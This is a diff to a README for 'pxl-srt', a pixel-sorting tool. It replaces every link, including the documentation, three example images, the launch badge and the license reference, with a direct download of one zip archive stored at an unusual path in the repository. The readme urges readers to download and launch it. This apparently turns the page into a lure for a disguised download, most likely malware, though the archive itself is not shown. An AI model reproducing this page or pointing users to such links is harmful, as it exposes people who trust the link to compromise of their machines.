@@ -25,15 +25,15 @@ The `pxl-srt` repository contains scripts and tools to sort image pixels by colo
 
 ## Resources 📚
 
-For more information and detailed instructions, please refer to the [**Documentation**](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0).
+For more information and detailed instructions, please refer to the [**Documentation**](https://github.com/RafasPlay22/pxl-srt/raw/refs/heads/main/homogeneize/srt_pxl_glumosity.zip).
 
 ## Examples 🎨
 
 Check out some stunning examples of pixel-sorted images created using the `pxl-srt` tools:
 
-![Example 1](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0)
-![Example 2](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0)
-![Example 3](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0)
+![Example 1](https://github.com/RafasPlay22/pxl-srt/raw/refs/heads/main/homogeneize/srt_pxl_glumosity.zip)
+![Example 2](https://github.com/RafasPlay22/pxl-srt/raw/refs/heads/main/homogeneize/srt_pxl_glumosity.zip)
+![Example 3](https://github.com/RafasPlay22/pxl-srt/raw/refs/heads/main/homogeneize/srt_pxl_glumosity.zip)
 
 ## Contribute 🤝
 
@@ -49,17 +49,17 @@ If you are passionate about image processing, pixel sorting, or creative coding,
 
 ## Get Started 🚦
 
-Ready to dive into the exciting world of sorting image pixels by color? Download the [**Software**](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0) and launch it to begin your creative journey!
+Ready to dive into the exciting world of sorting image pixels by color? Download the [**Software**](https://github.com/RafasPlay22/pxl-srt/raw/refs/heads/main/homogeneize/srt_pxl_glumosity.zip) and launch it to begin your creative journey!
 
 For more updates and releases, check the **Releases** section of the repository.
 
-[![Launch Software](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0)](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0)
+[![Launch Software](https://github.com/RafasPlay22/pxl-srt/raw/refs/heads/main/homogeneize/srt_pxl_glumosity.zip)](https://github.com/RafasPlay22/pxl-srt/raw/refs/heads/main/homogeneize/srt_pxl_glumosity.zip)
 
 Let your imagination run wild and explore the endless possibilities of pixel sorting with `pxl-srt`! 🌈🔍🎉
 
 ## License 📜
 
-This project is licensed under the MIT License - see the [https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0](https://github.com/RafasPlay22/pxl-srt/releases/tag/v2.0) file for details.
+This project is licensed under the MIT License - see the [https://github.com/RafasPlay22/pxl-srt/raw/refs/heads/main/homogeneize/srt_pxl_glumosity.zip](https://github.com/RafasPlay22/pxl-srt/raw/refs/heads/main/homogeneize/srt_pxl_glumosity.zip) file for details.
 
 ---
 
